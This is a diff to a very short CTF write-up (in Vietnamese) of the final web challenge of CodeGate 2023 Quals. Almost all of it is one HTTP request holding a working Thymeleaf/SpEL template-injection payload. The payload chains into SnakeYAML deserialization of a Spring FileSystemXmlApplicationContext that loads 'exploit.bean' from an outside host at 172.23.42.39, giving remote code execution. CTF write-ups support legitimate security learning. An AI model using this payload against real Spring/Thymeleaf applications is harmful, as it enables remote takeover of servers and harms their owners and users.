@@ -1,3 +1,5 @@
+Đây là một bài brief do mình ngồi tham khảo solution và làm lại của bài web cuối cùng trong đợt CodeGate 2023 Quals hồi đầu năm
+
 Request: 
 ```http
 GET /<@urlencode>__|*bla**{"a"+@servletContext.setAttribute("t","".class.forName("org.thymeleaf.TemplateEngine").newInstance())+@servletContext.getAttribute("t").setDialects("".class.forName("org.thymeleaf.spring6.dialect.SpringStandardDialect").newInstance())+@servletContext.getAttribute("t").process(("[["+"*"+"{T"+"(org.yaml.snakeyaml.Yaml).newInstance().load("+"".copyValueOf("a".toCharArray()[0].toChars(39))+thymeleafRequestContext.httpServletRequest.getParameterMap().values()[0][0]+"".copyValueOf("a".toCharArray()[0].toChars(39))+")}"+"]]"),"".class.forName("org.thymeleaf.context.Context").newInstance())+""}|__<@/urlencode>?a=<@urlencode>aaa: !!org.springframework.context.support.FileSystemXmlApplicationContext [ "http://172.23.42.39:8082/exploit.bean" ]<@/urlencode>%0a HTTP/1.1
